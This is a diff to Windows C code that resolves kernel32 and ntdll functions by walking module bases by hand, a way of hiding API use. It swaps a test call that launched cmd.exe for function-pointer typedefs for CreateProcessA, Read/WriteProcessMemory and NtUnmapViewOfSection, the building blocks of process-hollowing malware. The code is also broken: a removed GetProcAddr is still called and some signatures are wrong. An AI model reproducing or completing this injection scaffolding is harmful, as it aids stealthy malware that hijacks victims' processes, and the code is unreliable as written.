@@ -1,10 +1,16 @@
 #include <windows.h>
 #include <stdio.h>
 
-typedef  DWORD(__stdcall *_GetProcAddress)(DWORD, LPCSTR);
-typedef DWORD(__stdcall* _WinExec)(LPCSTR, u_int);
-typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE, PVOID); 
- 
+typedef  BOOL(__stdcall *_CreateProcessA)(LPCSTR,LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL,DWORD , LPVOID , LPCSTR ,LPSTARTUPINFOA ,LPPROCESS_INFORMATION);
+typedef  BOOL(__stdcall* _ReadProcessMemory)(HANDLE ,LPCVOID , LPVOID ,SIZE_T ,SIZE_T);
+typedef  BOOL(__stdcall* _WriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T);
+typedef  HANDLE(__stdcall* _CreateFileA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
+typedef  DWORD(__stdcall* _GetFileSize)(HANDLE, LPDWORD);
+typedef  LPVOID(__stdcall* _HeapAlloc)(HANDLE , DWORD, SIZE_T);
+typedef BOOL(__stdcall* _ReadFile)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED); 
+typedef  NTSTATUS(WINAPI* _NtQueryInformationProcess)(DWORD, LPCSTR);
+typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);
+
 
 DWORD kernel32_base, ntdll_base; 
 
@@ -88,11 +94,7 @@ DWORD find_function_address(DWORD base , char * function_name)
 int wmain()
 {
 	Kernel32_NTdll_bases();
-	_GetProcAddress GetProcAddr= find_function_address(kernel32_base, "GetProcAddress");
-	printf("GetProcAddr @0x%x\n" , GetProcAddr);
-	_WinExec Winex= GetProcAddr(kernel32_base, "WinExec"); 
-	printf("Winexec at : @0x%x\n", Winex);
-	Winex("cmd.exe", 0);
+	  
 	_NtUnmapViewOfSection NtUnmapViewOfSe = find_function_address(ntdll_base, "NtUnmapViewOfSection");
 	_NtUnmapViewOfSection NtUnmapViewOfTrue = GetProcAddr(ntdll_base, "NtUnmapViewOfSection");
 
